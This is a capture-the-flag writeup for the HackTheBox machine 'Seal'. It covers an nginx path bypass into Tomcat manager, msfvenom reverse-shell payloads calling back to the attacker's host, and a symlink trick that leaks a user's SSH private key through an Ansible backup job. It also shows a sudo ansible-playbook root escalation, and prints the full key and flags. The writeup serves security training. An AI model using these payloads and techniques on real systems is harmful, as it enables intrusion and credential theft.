# Seal - HackTheBox - Writeup
Linux, 30 Base Points, Medium

## Machine

![‏‏Seal.JPG](images/Seal.JPG)

### TL;DR;

To solve this machine, we begin by enumerating open services – finding the ports ```22```,```443``` and ```8080```.


***User 1:*** Found ```luis``` credentials (On ```seal_market``` commit```) to ```GitBucket``` portal,  From there, We found ```nginx``` configuration with [Nginx off-by-slash fail misconfiguration]( https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/), Use that to access to ```tomcat``` manager page to upload a reverse shell on ```war``` file and we get a shell as ```tomcat``` user.

***User 2:*** Found backup playbook (on ```/opt/backups/playbook/run.yml```) with ```copy_links=yes```, Create a file with symlink to ```/home/luis/.ssh/id_rsa``` to get the SSH private key of ```luis```.

***Root:*** By running ```sudo -l``` we found ```/usr/bin/ansible-playbook```, Using that, we create a playbook to get a reverse shell as root.

![pwn.JPG](images/pwn.JPG)

## Seal Solution


### User 1

Let's start with ```nmap``` scanning:

```console
┌─[evyatar@parrot]─[/hackthebox/Seal]
└──╼ $ nmap -p- -sC -sV -oA nmap/Seal 10.10.10.250

Starting Nmap 7.80 ( https://nmap.org ) at 2021-08-11 00:17 IDT
Nmap scan report for 10.10.10.250
Host is up (0.21s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
443/tcp  open  ssl/http   nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Seal Market
| ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-05-05T10:24:03
|_Not valid after:  2022-05-05T10:24:03
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
8080/tcp open  http-proxy
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 401 Unauthorized
|     Date: Tue, 10 Aug 2021 21:22:17 GMT
|     Set-Cookie: JSESSIONID=node0187gqx3v1pvm8xiosluw7o11e2.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 0
|   GetRequest: 
|     HTTP/1.1 401 Unauthorized
|     Date: Tue, 10 Aug 2021 21:22:14 GMT
|     Set-Cookie: JSESSIONID=node01oy35tej6qj3t1n2y3ayg88pw70.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Tue, 10 Aug 2021 21:22:15 GMT
|     Set-Cookie: JSESSIONID=node0y0mbz5ecx71i1d3782u17f20l1.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Allow: GET,HEAD,POST,OPTIONS
|     Content-Length: 0
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   Socks4: 
|     HTTP/1.1 400 Illegal character CNTL=0x4
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x4</pre>
|   Socks5: 
|     HTTP/1.1 400 Illegal character CNTL=0x5
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x5</pre>
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.80%I=7%D=8/11%Time=6112ECF7%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,F5,"HTTP/1\.1\x20401\x20Unauthorized\r\nDate:\x20Tue,\x2010\x2
SF:0Aug\x202021\x2021:22:14\x20GMT\r\nSet-Cookie:\x20JSESSIONID=node01oy35
SF:tej6qj3t1n2y3ayg88pw70\.node0;\x20Path=/;\x20HttpOnly\r\nExpires:\x20Th
SF:u,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nContent-Type:\x20text/htm
SF:l;charset=utf-8\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,108,"HT
SF:TP/1\.1\x20200\x20OK\r\nDate:\x20Tue,\x2010\x20Aug\x202021\x2021:22:15\
SF:x20GMT\r\nSet-Cookie:\x20JSESSIONID=node0y0mbz5ecx71i1d3782u17f20l1\.no
SF:de0;\x20Path=/;\x20HttpOnly\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2
SF:000:00:00\x20GMT\r\nContent-Type:\x20text/html;charset=utf-8\r\nAllow:\
SF:x20GET,HEAD,POST,OPTIONS\r\nContent-Length:\x200\r\n\r\n")%r(RTSPReques
SF:t,AD,"HTTP/1\.1\x20505\x20Unknown\x20Version\r\nContent-Type:\x20text/h
SF:tml;charset=iso-8859-1\r\nContent-Length:\x2058\r\nConnection:\x20close
SF:\r\n\r\n<h1>Bad\x20Message\x20505</h1><pre>reason:\x20Unknown\x20Versio
SF:n</pre>")%r(FourOhFourRequest,F4,"HTTP/1\.1\x20401\x20Unauthorized\r\nD
SF:ate:\x20Tue,\x2010\x20Aug\x202021\x2021:22:17\x20GMT\r\nSet-Cookie:\x20
SF:JSESSIONID=node0187gqx3v1pvm8xiosluw7o11e2\.node0;\x20Path=/;\x20HttpOn
SF:ly\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nConte
SF:nt-Type:\x20text/html;charset=utf-8\r\nContent-Length:\x200\r\n\r\n")%r
SF:(Socks5,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x5\r\nCon
SF:tent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\n
SF:Connection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\
SF:x20Illegal\x20character\x20CNTL=0x5</pre>")%r(Socks4,C3,"HTTP/1\.1\x204
SF:00\x20Illegal\x20character\x20CNTL=0x4\r\nContent-Type:\x20text/html;ch
SF:arset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r
SF:\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x2
SF:0CNTL=0x4</pre>")%r(RPCCheck,C7,"HTTP/1\.1\x20400\x20Illegal\x20charact
SF:er\x20OTEXT=0x80\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nCo
SF:ntent-Length:\x2071\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x
SF:20400</h1><pre>reason:\x20Illegal\x20character\x20OTEXT=0x80</pre>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.82 seconds

```

Port 8080 contains:

![port8080.JPG](images/port8080.JPG)

And port 443:

![port443.JPG](images/port443.JPG)

Let's register to ```GitBucket`` website (port 8080):

![gitbucket.JPG](images/gitbucket.JPG)

As we can see It's the repository of the ```Seal Market``` website.

By looking at TODO notes we can see:
>Remove mutual authentication for dashboard, setup registration and login features.
>Deploy updated tomcat configuration.
>Disable manager and host-manager.

By looking at tomcat configuration we can see the following commit (by ```luis@seal.htb``` user) [http://seal.htb:8080/root/seal_market/commit/971f3aa3f0a0cc8aac12fd696d9631ca540f44c7](http://seal.htb:8080/root/seal_market/commit/971f3aa3f0a0cc8aac12fd696d9631ca540f44c7) which contains the  following credentials:

![creds.JPG](images/creds.JPG)

```<user username="tomcat" password="42MrHBf*z8{Z%" roles="manager-gui,admin-gui"/>```.

Those creds work with user ```luis```  to GitBucket on port 8080:

![luis.JPG](images/luis.JPG)

On the page [http://10.10.10.250:8080/root/seal_market/blob/master/nginx/sites-enabled/default](http://10.10.10.250:8080/root/seal_market/blob/master/nginx/sites-enabled/default) we can see the following ```nginx```	 configuration:

![nginx.JPG](images/nginx.JPG)

Let's look at ```location /manager/html```, By reading the blog [https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/](https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/) about nginx-misconfigurations we can see we can use **Nginx off-by-slash fail** misconfiguration on that URL to access to tomcat manager page which is located on ```/manager/html```.

If we are trying to access it directly by [https://seal.htb/manager/html](https://seal.htb/manager/html) we will get HTTP response code 403.

If we are using the misconfiguration and bypass techniques from [https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf) we can use the following logic:

![bypass.JPG](images/bypass.JPG)

So according the logic above we can access to [https://seal.htb/manager/;/html](https://seal.htb/manager/;/html) or to [https://seal.htb/manager/.;/html](https://seal.htb/manager/.;/html) to get tomcat manager page:

![tomcat.JPG](images/tomcat.JPG)

If we have the tomcat manager page we can deploy a ```war``` file with a reverse shell.

First, Let's create the ```war``` using ```msfvenom``` as follow:
```console
┌─[evyatar@parrot]─[/hackthebox/Seal]
└──╼ $ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.14 LPORT=9999 -f war -o rshell.war
Payload size: 1098 bytes
Final size of war file: 1098 bytes
Saved as: rshell.war
```

Create listener on ```metasploit```:
```console
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload java/jsp_shell_reverse_tcp
payload => java/jsp_shell_reverse_tcp
msf6 exploit(multi/handler) > set LPORT 9999
LPORT => 9999
msf6 exploit(multi/handler) > set LHOST 10.10.14.14
LHOST => 10.10.14.14
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.14.14:9999 

```

Now, upload the war file to the Apache Tomcat manager deploy section, Intercept the request using BurpSuite and change the URL from ```/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=A84701CDC5F33874EC130407E83C5215``` to ```/manager/;/html/upload?org.apache.catalina.filters.CSRF_NONCE=A84701CDC5F33874EC130407E83C5215``` then forward the request:

![deploy.JPG](images/deploy.JPG)

The script will appear under the application section on the same page, click on it, and wait for the connection back:
 
![applications.JPG](images/applications.JPG)

And we get ```tomcat``` user shell:
```console
[*] Started reverse TCP handler on 10.10.14.14:9999 
[*] Command shell session 1 opened (10.10.14.14:9999 -> 10.10.10.250:47242) at 2021-08-12 03:32:42 +0300

whoami
tomcat

```

### User 2

By running ```ps -aux | grep luis``` we found the following process running:
```console
root        4235  0.0  0.0   2608   540 ?        Ss   11:52   0:00 /bin/sh -c sleep 30 && sudo -u luis /usr/bin/ansible-playbook /opt/backups/playbook/run.yml
```

Let's look at the playbook ```yaml``` file ```/opt/backups/playbook/run.yml```:
```yaml
- hosts: localhost
  tasks:
  - name: Copy Files
    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
  - name: Server Backups
    archive:
      path: /opt/backups/files/
      dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"
  - name: Clean
    file:
      state: absent
      path: /opt/backups/files/
```

We can see three tasks, one that copy files from ```src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard``` to  ```dest=/opt/backups/files``` **including** ```copy_links=yes```.

Another one creates an archive from the dest directory and the last one that cleanses the dest directory.

As we can see the copy running with ```copy_links=yes```, Meaning that we can create link to ```luis``` ssh private key (```/home/luis/.ssh/id_rsa``` ).

```console
pwd
/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads
ln -s /home/luis/.ssh/id_rsa ss
ls -ltr
lrwxrwxrwx 1 tomcat tomcat 22 Aug 12 11:51 ss -> /home/luis/.ssh/id_rsa
```

Great, Now we need to wait to archive task that create for us ```gz``` file on ```/opt/backups/files/``` which is possible contains ```luis``` ssh private key on ```/var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/ss```.

After few seconds we can see the following gzip file on ```/opt/backups/archives/```:
```console
pwd
/opt/backups/archives
ls
backup-2021-08-12-11:55:33.gz
```

Let's copy and extract the gzip file to our host using ```nc```:
```console
┌─[evyatar@parrot]─[/hackthebox/Seal/backup]
└──╼ $ ls
backup-2021-08-12-115533.gz
┌─[evyatar@parrot]─[/hackthebox/Seal/backup]
└──╼ $ gunzip backup-2021-08-12-115533.gz
┌─[evyatar@parrot]─[/hackthebox/Seal/backup]
└──╼ $ file backup-2021-08-12-115533
backup-2021-08-12-115533: POSIX tar archive
┌─[evyatar@parrot]─[/hackthebox/Seal/backup]
└──╼ $ tar xvf backup-2021-08-12-115533
dashboard/
dashboard/scripts/
dashboard/images/
dashboard/css/
dashboard/uploads/
dashboard/bootstrap/
tar: dashboard/uploads: time stamp 2021-08-12 15:03:34.4266555 is 163.30818263 s in the future
dashboard/index.html
dashboard/scripts/flot/
dashboard/scripts/datatables/
dashboard/scripts/jquery-ui-1.10.1.custom.min.js
dashboard/scripts/common.js
dashboard/scripts/jquery-1.9.1.min.js
dashboard/scripts/flot/jquery.flot.resize.js
dashboard/scripts/flot/jquery.flot.pie.js
dashboard/scripts/flot/jquery.flot.js
dashboard/scripts/datatables/jquery.dataTables.js
dashboard/images/jquery-ui/
dashboard/images/icons/
dashboard/images/img.jpg
dashboard/images/user.png
dashboard/images/bg.png
dashboard/images/jquery-ui/picker.png
dashboard/images/icons/css/
dashboard/images/icons/font/
dashboard/images/icons/css/font-awesome.css
dashboard/images/icons/font/fontawesome-webfont3294.ttf
dashboard/images/icons/font/fontawesome-webfontd41d.eot
dashboard/images/icons/font/fontawesome-webfont3294.eot
dashboard/images/icons/font/fontawesome-webfont3294.woff
dashboard/css/theme.css
dashboard/uploads/ss
dashboard/bootstrap/css/
dashboard/bootstrap/js/
dashboard/bootstrap/img/
dashboard/bootstrap/css/bootstrap-responsive.min.css
dashboard/bootstrap/css/bootstrap.min.css
dashboard/bootstrap/js/bootstrap.min.js
dashboard/bootstrap/img/glyphicons-halflings.png
dashboard/bootstrap/img/glyphicons-halflings-white.png
```

And we can see the file ```dashboard/uploads/ss``` which contains ssh private key of ```luis``` user:
```console
┌─[evyatar@parrot]─[/hackthebox/Seal/backup]
└──╼ $ cat dashboard/uploads/ss
-----BEGIN OPENSSH PRIVATE KEY-----
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
u8KqOiDVrwmFJRAAAACWx1aXNAc2VhbAE=
-----END OPENSSH PRIVATE KEY-----

```

Let's use this ssh private key to login ```luis``` user.
```console
┌─[evyatar@parrot]─[/hackthebox/Seal]
└──╼ $ ssh -i id_rsa luis@seal.htb
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 12 Aug 2021 12:07:26 PM UTC

  System load:           0.0
  Usage of /:            46.6% of 9.58GB
  Memory usage:          13%
  Swap usage:            0%
  Processes:             171
  Users logged in:       0
  IPv4 address for eth0: 10.10.10.250
  IPv6 address for eth0: dead:beef::250:56ff:feb9:68da

 * Pure upstream Kubernetes 1.21, smallest, simplest cluster ops!

     https://microk8s.io/

22 updates can be applied immediately.
15 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri May  7 07:00:18 2021 from 10.10.14.2
luis@seal:~$ cat user.txt
1311074a362cde6998f1fe4ee125a222
```

And we get the user flag ```1311074a362cde6998f1fe4ee125a222```.

### Root

By running ```sudo -l``` we can see the following:
```console
luis@seal:~$ sudo -l
Matching Defaults entries for luis on seal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User luis may run the following commands on seal:
    (ALL) NOPASSWD: /usr/bin/ansible-playbook *
```

Meaning that we can create our playbook to execute shell as root.

First, Let's ```msfvenom``` payload for linux:
```console
┌─[evyatar@parrot]─[/hackthebox/Seal]
└──╼ $ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.14 LPORT=4242 -f elf > reverse.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
```

Next, Copy that using ```nc``` to ```/home/luis/```, Create the following playbook:
```yaml
- hosts: localhost

  tasks:
  - name: Reverse shell as root
    command: /home/luis/reverse.elf
```

Listen to port 4242 using ```nc```:
```console
┌─[evyatar@parrot]─[/hackthebox/Seal]
└──╼ $ nc -lvp 4242
listening on [any] 4242 ...
```

Run the playbook as root:
```console
luis@seal:~$ sudo /usr/bin/ansible-playbook rev-playbook.yml 
[WARNING]: provided hosts list is empty, only localhost is available. Note that the implicit localhost does not match 'all'

PLAY [localhost] *****************************************************************************************************************************************************************************

TASK [Gathering Facts] ***********************************************************************************************************************************************************************
ok: [localhost]

TASK [Reverse shell as root] *****************************************************************************************************************************************************************

```

Get shell:
```console
listening on [any] 4242 ...
connect to [10.10.16.227] from seal.htb [10.10.10.250] 57546
whoami
root
cat /root/root.txt
0dd41be6d3f326e5b57ff32924ec923d
```

And we get the root flag ```0dd41be6d3f326e5b57ff32924ec923d```.
